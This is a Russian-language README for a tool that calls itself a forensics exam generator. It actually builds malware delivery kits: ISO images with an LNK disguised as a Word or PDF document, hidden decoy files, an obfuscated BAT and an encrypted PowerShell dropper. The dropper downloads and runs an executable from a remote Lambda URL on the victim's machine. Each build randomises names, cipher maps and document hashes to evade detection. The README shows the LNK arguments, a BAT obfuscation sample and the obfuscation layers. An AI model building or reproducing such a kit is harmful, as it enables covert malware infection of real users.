# exam-gen

Автоматический генератор уникальных kill chain пакетов для экзамена по компьютерной криминалистике.

Скрипт принимает папки-варианты с готовыми `.docx` документами и на выходе даёт **два ZIP-архива на каждый вариант**:
- `VariantName.zip` -- Word-версия (ISO с DOCX + kill chain, LNK с иконкой Word)
- `VariantName_pdf.zip` -- PDF-версия (ISO с PDF + kill chain, LNK с иконкой Edge)

Каждый запуск генерирует **полностью уникальные** артефакты:
- Новая карта шифра для каждого пакета (Word и PDF -- разные)
- Новые имена переменных и функций в PS1
- Рандомные имена BAT, PS1, decoy-файлов (2-3 символа, уникальны на каждый пакет)
- Рандомные placeholder-теги (`##xxxx##`) в PS1
- Разные хеши документов в каждом пакете (независимая модификация)

Работает на **Windows** и **Linux**.

## Требования

### Python 3.8+

```bash
pip install -r requirements.txt
```

| Пакет | Назначение |
|-------|------------|
| `python-docx` | Модификация DOCX (невидимый текст для смены хеша) |
| `pycdlib` | Создание ISO-образов с Joliet и hidden-флагами |
| `pylnk3` | Создание Windows-ярлыков (.lnk) |
| `docx2pdf` | Конвертация DOCX -> PDF |

### DOCX -> PDF конвертация

| ОС | Что используется | Установка |
|----|-----------------|-----------|
| **Windows** | Microsoft Word (через COM) | Word должен быть установлен (обычно уже есть) |
| **Linux** | LibreOffice headless | `sudo apt install libreoffice-writer` |

## Быстрый старт

### Windows

```powershell
git clone https://github.com/hungohun48/exam-gen.git
cd exam-gen
pip install -r requirements.txt
copy .env.example .env
# отредактировать .env -- вписать LAMBDA_URL и API_KEY
python generate.py
```

### Linux

```bash
git clone https://github.com/hungohun48/exam-gen.git
cd exam-gen
pip install -r requirements.txt
sudo apt install libreoffice-writer
cp .env.example .env
nano .env   # вписать LAMBDA_URL и API_KEY
python3 generate.py
```

## Конфигурация

Все параметры читаются из **переменных окружения** или файла `.env` рядом со скриптом.

| Переменная | Обязательная | По умолчанию | Описание |
|------------|:---:|---|---|
| `LAMBDA_URL` | да | -- | URL Lambda Function для доставки payload |
| `API_KEY` | да | -- | Значение заголовка `X-Api-Key` |
| `TARGET_FILENAME` | нет | `cat.exe` | Имя скачиваемого файла на стороне жертвы |
| `VARIANTS_DIR` | нет | `./variants` | Путь к папкам вариантов |
| `OUTPUT_DIR` | нет | `./output` | Путь для выходных ZIP-архивов |

Пример `.env`:

```env
LAMBDA_URL=https://xxx.lambda-url.us-east-1.on.aws/?file=releases%2Fcat.exe
API_KEY=your-api-key-here
TARGET_FILENAME=cat.exe
```

Альтернативно -- через `export`:

```bash
export LAMBDA_URL='https://...'
export API_KEY='...'
python3 generate.py
```

## Структура проекта

```
exam-gen/
├── generate.py          # Основной скрипт (единый файл)
├── requirements.txt     # Зависимости Python
├── .env.example         # Шаблон конфигурации
├── .env                 # Твой конфиг (не в git)
├── .gitignore
├── variants/            # ВХОД: папки вариантов с .docx
│   ├── Variant-01/
│   │   ├── doc1.docx
│   │   └── doc2.docx
│   └── Variant-02/
│       └── doc1.docx
└── output/              # ВЫХОД: готовые пакеты
    ├── Variant-01.zip
    ├── Variant-01_pdf.zip
    ├── Variant-02.zip
    └── Variant-02_pdf.zip
```

## Пайплайн генерации (на каждый вариант)

### Шаг 1 -- Копирование DOCX-оригиналов

Каждый `.docx` из папки варианта копируется во временную директорию.

### Шаг 2 -- Сборка Word-пакета

Для Word-пакета генерируются **собственные** уникальные артефакты:

1. Каждый DOCX **независимо** модифицируется -- в конец добавляется невидимый абзац (белый текст, 1pt, 30-80 случайных слов) для смены хеша
2. Первый DOCX переименовывается в рандомное имя (decoy, скрытый)
3. Остальные DOCX остаются видимыми
4. Генерируется **уникальная карта шифра** (83 символа -> 2-символьные коды)
5. Генерируется PS1-дроппер с рандомными переменными и placeholder-тегами
6. Генерируется BAT с обфускацией set-variable fragmentation + junk REM
7. Создаётся LNK с иконкой Word (`SHELL32.dll,1`), target -> `cmd.exe /c "start /min .\{bat}"`
8. Всё пакуется в ISO (Joliet, hidden-флаги на BAT, PS1, decoy)
9. ISO пакуется в `VariantName.zip`

### Шаг 3 -- Сборка PDF-пакета

Для PDF-пакета генерируются **свои** уникальные артефакты (не совпадают с Word):

1. DOCX-оригиналы копируются и **заново** модифицируются (другой невидимый текст, другие хеши)
2. Все DOCX конвертируются в PDF (Word на Windows / LibreOffice на Linux)
3. Первый PDF переименовывается в рандомное имя (decoy, скрытый)
4. Генерируется **новая** карта шифра, PS1, BAT -- полностью отличные от Word-пакета
5. Создаётся LNK с иконкой Edge (`msedge.exe,11`)
6. Пакуется в ISO -> `VariantName_pdf.zip`

## Уникальность пакетов

Каждый пакет (Word и PDF) внутри одного варианта имеет:

| Артефакт | Уникален? |
|----------|:---------:|
| Имена BAT/PS1/decoy файлов | да (рандомные 2-3 символа) |
| Карта шифра PS1 | да (новая генерация) |
| Имена переменных в PS1 | да (из пула слов + суффикс) |
| Placeholder-теги (`##xxxx##`) | да (4-8 рандомных символов) |
| Хеши DOCX/PDF | да (независимая модификация) |
| Содержимое BAT | да (перемешанные SET + REM) |

## Содержимое ISO (вид на Windows)

При монтировании ISO в Windows Explorer с настройками по умолчанию:

| Файл | Видимость | Назначение |
|------|:---------:|------------|
| `Document.lnk` | видимый | Ярлык (выглядит как DOCX/PDF), запускает kill chain |
| `doc2.docx` / `doc2.pdf` | видимый | Дополнительные документы (если есть) |
| `xyz.docx` / `xyz.pdf` | скрытый | Decoy-документ (рандомное имя), открывается при клике на LNK |
| `ab.bat` | скрытый | Обфусцированный BAT (рандомное имя): открывает decoy + запускает PS1 |
| `cd.ps1` | скрытый | Зашифрованный PS1-дроппер (рандомное имя) |

## LNK-ярлык

LNK создаётся без `WorkingDirectory` -- Windows автоматически использует директорию ярлыка (точку монтирования ISO) как рабочую папку. Это обеспечивает корректный запуск BAT при клике на LNK с любого диска.

- Target: `C:\Windows\System32\cmd.exe`
- Arguments: `/c "start /min .\{bat}"`
- ShowCommand: 1 (Normal) -- окно cmd.exe мелькает минимально, BAT запускается через `start /min`
- Icon: Word (`SHELL32.dll,1`) или Edge (`msedge.exe,11`)

## Обфускация

### BAT (set-variable fragmentation)

```batch
@echo off
cd /d "%~dp0"
REM Configuration loader v3
set "c=ell"
REM Checking system integrity...
set "a=pow"
set "f= -Ex"
set "b=ersh"
...
start xyz.docx
%a%%b%%c%.exe %d%%e%%f%%g%%h%%i%%j% -File cd.ps1
```

`powershell` собирается из фрагментов через `%a%%b%%c%`, аргументы аналогично. SET-строки перемешаны, между ними вставлены junk REM-комментарии.

### PS1 (подстановочный шифр + Base64)

```
Слои обфускации:
1. Подстановочный шифр -- тело скрипта (83 уникальных 2-символьных кода)
2. Base64 -- URL и имя файла
3. Рандомные имена переменных -- стиль Windows API / Hex
4. Рандомные placeholder-теги (##xxxx##) для URL и filename
5. Invoke-Expression -- финальное выполнение
```

## Проверка результатов

```bash
# 1. Запустить генерацию
python3 generate.py

# 2. Проверить выход
ls output/
# Variant-01.zip  Variant-01_pdf.zip  Variant-02.zip  Variant-02_pdf.zip

# 3. Скопировать на Windows -> распаковать ZIP -> смонтировать ISO
# 4. Убедиться:
#    - Видны только LNK + дополнительные документы
#    - Клик по LNK -> открывается decoy + PS1 запускается
#    - PS1 скачивает файл с Lambda -> запускает
# 5. Каждый пакет (Word и PDF) имеет уникальные:
#    - Имена файлов (BAT, PS1, decoy)
#    - Карту шифра и переменные PS1
#    - Placeholder-теги
#    - Хеши документов
```
